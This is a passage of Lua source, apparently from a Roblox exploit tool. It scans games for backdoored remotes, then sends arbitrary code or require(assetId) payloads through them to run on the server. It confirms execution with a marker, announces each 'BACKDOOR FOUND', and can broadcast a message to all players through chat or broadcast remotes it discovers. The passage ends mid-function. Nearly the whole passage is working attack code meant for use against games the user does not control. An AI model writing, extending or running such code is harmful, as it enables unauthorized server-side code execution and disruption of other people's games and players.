local function runLocal(code)
	local f = loadstring or load
	if not f then
		outputLine("[x] executor has no loadstring")
		return
	end
	local fn, err = f(code)
	if not fn then
		outputLine("[x] compile error: " .. tostring(err))
		log("BAD", "local compile failed")
		return
	end
	local ok, res = pcall(fn)
	if ok then
		outputLine("[ok] ran locally, returned: " .. tostring(res))
		log("GOOD", "local execution ok")
	else
		outputLine("[x] runtime error: " .. tostring(res))
		log("BAD", "local runtime error: " .. tostring(res))
	end
end

local function watchExecMarker(g)
	local done = false
	local conns = {}
	local function finish(confirmed)
		if done then
			return
		end
		done = true
		for _, c in ipairs(conns) do
			c:Disconnect()
		end
		if confirmed then
			outputLine("[ok] SERVER CONFIRMED EXECUTION")
			log("GOOD", "execution confirmed via server marker")
			playSound()
		else
			outputLine("[!] no confirmation in " .. CONFIG.ExecConfirmWindow .. "s (code may still have run)")
			log("WARN", "execution unconfirmed")
		end
	end
	table.insert(
		conns,
		workspace.AttributeChanged:Connect(function(attr)
			if attr == "JZXE_" .. g then
				finish(true)
			end
		end)
	)
	table.insert(
		conns,
		game.DescendantAdded:Connect(function(child)
			if child.Name == "JZXE_" .. g then
				finish(true)
			end
		end)
	)
	task.delay(CONFIG.ExecConfirmWindow, function()
		finish(false)
	end)
end

local function executeCurrent()
	if State.executing then
		outputLine("[i] already executing...")
		return
	end
	State.executing = true
	task.delay(3, function()
		State.executing = false
	end)
	local mode = State.modes[State.modeIndex]
	local code
	if mode == "REQUIRE" then
		local id = UI.RequireIdBox.Text:match("%d+")
		if not id then
			outputLine("[x] invalid asset id")
			return
		end
		local args = UI.RequireArgsBox.Text
		if args == "" then
			args = '"' .. PlayerName .. '"'
		end
		code = ("require(%s)(%s)"):format(id, args)
	else
		code = UI.CodeBox.Text
		if code == "" then
			outputLine("[x] empty code")
			return
		end
	end
	local confirmGuid
	local ref = State.targetRefs[State.targetIndex]
	if ref ~= nil and State.settings.confirmExec then
		confirmGuid = newGuid()
		code = code .. "\n" .. markerPayload("JZXE_", confirmGuid)
	end
	if ref == nil then
		runLocal(code)
	else
		outputLine("> sending " .. #code .. " bytes -> " .. ref.Name)
		if confirmGuid then
			watchExecMarker(confirmGuid)
		end
		task.spawn(function()
			local isFunc = ref:IsA("RemoteFunction")
			local shapes = { code }
			-- reuse the argument shape that worked during scanning when known
			for _, m in ipairs(State.results) do
				if m.remote == ref and m.workingShape ~= nil then
					shapes = { m.workingShape }
					break
				end
			end
			if shapes[1] == code and #shapes == 1 then
				shapes = probeVariants(code)
			end
			local sent = false
			for _, shape in ipairs(shapes) do
				local ok, res = sendPayload(ref, shape)
				if ok then
					sent = true
					if isFunc and res ~= nil then
						outputLine("[ok] invoked, returned: " .. tostring(res))
					elseif isFunc then
						outputLine("[ok] invoked " .. ref.Name)
					else
						outputLine("[ok] payload sent to " .. ref.Name)
					end
					break
				end
			end
			if not sent then
				outputLine("[x] all send attempts failed")
				log("BAD", "could not deliver payload to " .. ref.Name)
			else
				log("INFO", "payload sent to " .. ref.Name .. " (" .. mode .. ")")
			end
		end)
	end
end

bindClick(UI.ExecBtn, executeCurrent)

local function hintBroadcast(message)
	task.spawn(function()
		local sent = false
		-- channel 1: modern text chat
		pcall(function()
			local tcs = game:GetService("TextChatService")
			local ch = tcs:FindFirstChild("TextChannels")
			local general = ch and ch:FindFirstChild("RBXGeneral")
			if general then
				general:SendAsync(message)
				sent = true
			end
		end)
		-- channel 2: legacy chat
		if not sent then
			pcall(function()
				local rs = game:GetService("ReplicatedStorage")
				local ev = rs:FindFirstChild("DefaultChatSystemChatEvents")
				local say = ev and ev:FindFirstChild("SayMessageRequest")
				if say then
					say:FireServer(message, "All")
					sent = true
				end
			end)
		end
		-- channel 3: known broadcast remotes games commonly expose
		if not sent then
			pcall(function()
				for _, obj in ipairs(game:GetDescendants()) do
					if obj:IsA("RemoteEvent") then
						local n = obj.Name:lower()
						if
							n:find("broadcast", 1, true)
							or n:find("announce", 1, true)
							or n:find("notifyall", 1, true)
							or n:find("chatmsg", 1, true)
						then
							pcall(obj.FireServer, obj, message)
							sent = true
							break
						end
					end
				end
			end)
		end
		if sent then
			log("GOOD", "hint broadcast to all players")
			toast("HINT SENT", message, THEME.good)
		else
			log("WARN", "no chat channel — hint shown locally only")
			toast("HINT (local)", message, THEME.warn)
		end
	end)
end

local function markFound(m)
	if not m.reported then
		m.reported = true
		State.stats.confirmed = State.stats.confirmed + 1
		setStats()
		local ok, fullPath = pcall(function()
			return m.remote:GetFullName()
		end)
		fullPath = ok and fullPath or m.remote.Name
		log("GOOD", "BACKDOOR CONFIRMED -> " .. tostring(fullPath))
		m.displayReason = "executes code server-side — press EXEC"
		if State.stats.confirmed == 1 then
			bigBanner(
				"BACKDOOR FOUND",
				tostring(fullPath) .. "  [" .. m.remote.ClassName .. "]",
				THEME.good
			)
		else
			toast("HIT #" .. State.stats.confirmed, tostring(fullPath), THEME.good)
		end
		playSound()
		renderResults()
		rebuildTargets()
		task.spawn(History.Record, tostring(fullPath), m.remote.ClassName)
		if State.settings.autoHint and not State.hintSentThisScan then
			State.hintSentThisScan = true
			hintBroadcast(CONFIG.HintMessage)
		end
	end
	m.hits = m.hits + 1
end

local function collectGameRequiresCore()
	local found = {}
	local counters = { scanned = 0, readable = 0 }
	local count = 0
	for _, obj in ipairs(game:GetDescendants()) do
		count = count + 1
		local cn = obj.ClassName
		if cn == "ModuleScript" or cn == "LocalScript" or cn == "Script" then
			harvestRequireIds(obj, found, counters)
		end
		if count % CONFIG.EnumChunk == 0 then
			task.wait()
		end
	end
	local list = {}
	for _, data in pairs(found) do
		table.insert(list, data)
	end
	table.sort(list, function(a, b)
		if a.count ~= b.count then
			return a.count > b.count
		end
		return a.id < b.id
	end)
	while #list > 30 do
		table.remove(list)
	end
	return list, counters
end

local function collectGameRequires()
	if State.collecting then
		return
	end
	State.collecting = true
	UI.CollectBtn.Text = "READING..."
	log("INFO", "harvesting require() ids from game scripts...")
	local t0 = os.clock()
